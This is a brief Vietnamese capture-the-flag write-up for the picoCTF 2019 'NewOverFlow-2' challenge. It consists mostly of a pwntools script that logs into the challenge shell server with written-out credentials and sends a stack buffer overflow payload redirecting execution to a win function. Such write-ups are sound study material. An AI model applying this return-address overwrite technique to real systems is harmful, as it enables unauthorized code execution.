# Solution
### bài này sẽ dẫn dụ mình để pass các tham số của từng hàm win trong souce, nhưng thực tế cách solve nó y hệt như bài NewOverFlow1
Hint: `Arguments aren't stored on the stack anymore ;)`

Đây là file exploit của mình:
```sh
from pwn import *
#s = process("./vuln")
ss = ssh(host = '2019shell1.picoctf.com',user= 'hazir',password='2k4')
s = ss.run("cd  /problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e; ./vuln")
pl = "a"*0x48 + p64(0x000000000040028d) + p64(0x40084d)
s.sendline(pl)
s.interactive()
```